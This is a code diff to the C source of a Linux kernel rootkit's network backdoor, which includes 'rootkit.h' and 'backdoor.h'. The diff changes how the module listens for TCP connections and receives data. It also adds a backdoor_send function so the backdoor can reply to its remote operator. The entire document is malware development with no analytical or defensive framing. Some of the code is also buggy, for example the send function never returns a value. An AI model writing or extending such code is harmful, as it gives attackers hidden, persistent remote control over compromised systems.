@@ -1,29 +1,27 @@
 #include "rootkit.h"
 #include "backdoor.h"
 #include "cmd.h"
+#include "rootkit.h"
 
-static struct kbackdoor_t *bkdoor = NULL;
+struct kbackdoor_t *bkdoor = NULL;
 
-size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf, size_t len)
+ssize_t backdoor_recv(struct socket *sock, uint8_t *buf, size_t len)
 {
 	struct msghdr msg;
 	struct kvec iov;
   mm_segment_t oldfs;
 	size_t size = 0;
 
-	if (sock->sk == NULL)
-		return 0;
+	if (sock->sk == NULL) { return -1; }
 
-  
   memset(&iov, 0, sizeof(struct iovec));
   memset(&msg, 0, sizeof(struct msghdr));
-
 
   // Setup IO vector for sock_recvmsg
 	iov.iov_base = buf;
 	iov.iov_len = len;
 
-	msg.msg_name = addr;
+	msg.msg_name = &bkdoor->addr;
 	msg.msg_namelen = sizeof(struct sockaddr_in);
 	msg.msg_control = NULL;
 	msg.msg_controllen = 0;
@@ -36,6 +34,24 @@ size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf
   printk(KERN_INFO "Received %ld: %s\n", size, buf);
 
 	return size;
+}
+
+ssize_t backdoor_send(struct socket *sock, uint8_t *buf, size_t len)
+{
+  struct msghdr msg;
+  struct kvec iov;
+  
+  size_t size = 0;
+  if (sock->sk == NULL) { return -1; }
+
+  memset(&iov, 0, sizeof(struct iovec));
+  memset(&msg, 0, sizeof(struct msghdr));
+
+  // Setup IO vector for sock_recvmsg
+	iov.iov_base = buf;
+	iov.iov_len = len;
+
+  size = kernel_sendmsg(sock, &msg, &iov, 1, len);
 }
 
 int backdoor_run(void *data)
@@ -93,17 +109,13 @@ int backdoor_run(void *data)
   debug("Listen successful\n");
 
   // Create a socket to accept connections
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
-    err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
-#elif LINUX_VERSION_CODE > KERNEL_VERSION(2,6,5)
-    err = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
-#else
-    err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
-#endif
+  err = sock_create_lite(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
+  // Created with sock_create_lite, set the operations
+  bkdoor->conn->ops = bkdoor->sock->ops;
+
   if (err < 0) {
     // Unable to create accept socket
     sock_release(bkdoor->sock);
-    sock_release(bkdoor->conn);
     bkdoor->sock = NULL;
     bkdoor->conn = NULL;
     bkdoor->running = 0;
@@ -127,7 +139,7 @@ int backdoor_run(void *data)
 
     printk(KERN_INFO "Received a new connection\n");
 
-    size = backdoor_recv(bkdoor->conn, &bkdoor->addr, buffer, sizeof(buffer));
+    size = backdoor_recv(bkdoor->conn, buffer, sizeof(buffer));
     printk(KERN_INFO "Received %ld bytes: %s\n", size, buffer);
 
     // If size < 0, connection probably closed
@@ -180,7 +192,6 @@ int backdoor_stop(void)
 		bkdoor->sock = NULL;
 	}
   if (bkdoor->conn != NULL) {
-    sock_release(bkdoor->conn);
     bkdoor->conn = NULL;
   }
   printk(KERN_INFO "Socket shutdown successful\n");
